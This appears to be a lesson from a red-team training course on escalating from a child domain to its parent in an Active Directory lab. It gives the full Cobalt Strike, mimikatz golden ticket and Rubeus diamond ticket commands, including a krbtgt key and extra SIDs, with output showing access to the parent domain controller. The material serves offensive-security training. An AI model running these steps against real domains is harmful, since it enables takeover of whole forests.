	When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. This be found in the lab where **dev.cyberbotic.io** is a child domain of **cyberbotic.io**.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

  

**SourceName** is the current domain, **TargetName** is the foreign domain, **TrustDirection** is the trust direction (bidirectional is two-way), and **TrustAttributes: WITHIN_FOREST** let's us know that both of these domains are part of the same forest which implies a parent/child relationship.

If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History. SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

This can be achieved using either a Golden or Diamond Ticket.

  

### Golden Ticket

The process is the same as creating Golden Tickets previously, the only additional information required is the SID of a target group in the parent domain.

```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512

beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

Name              
----              
dc-1.cyberbotic.io
```

Create the golden ticket:

```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
User      : Administrator
Domain    : dev.cyberbotic.io (DEV)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-378720957-2217973887-3501892633-512 ;
ServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac
Lifetime  : 3/11/2021 2:49:33 PM ; 3/12/2021 12:49:33 AM ; 3/18/2021 2:49:33 PM
-> Ticket : cyberbotic.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Where:

-   `/user` is the username to impersonate.
-   `/domain` is the current domain.
-   `/sid` is the current domain SID.
-   `/sids` is the SID of the target group to add ourselves to.
-   `/aes256` is the AES256 key of the current domain's krbtgt account.
-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.
-   `/endin` sets the expiry date for the ticket to 60 mins.
-   `/renewmax` sets how long the ticket can be valid for if renewed.

```
beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
beacon> ls \\dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 10:12:58   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/17/2021 22:52:56   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:10:50   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     05/17/2021 23:15:24   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     05/25/2021 08:39:37   pagefile.sys
 
 beacon> rev2self
```

### Diamond Ticket

The Rubeus `diamond` command also has a `/sids` parameter, with which we can supply the extra SIDs we want in our ticket.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

[...snip...]

beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\diamond.kirbi

beacon> ls \\dc-1\c$
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings

[...snip...]
```

If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly because the trusts are transitive.

There are also other means which do not require DA in the child, some of which we've already seen. You can also kerberoast and ASREProast across domain trusts, which may lead to privileged credential disclosure. Because principals in CYBER can be granted access to resources in DEV, you may find instances where they are accessing machines we have compromised. If they interact with a machine with unconstrained delegation, we can capture their TGTs. If they're on a machine interactively, e.g. over RDP, we can impersonate them just like any other user.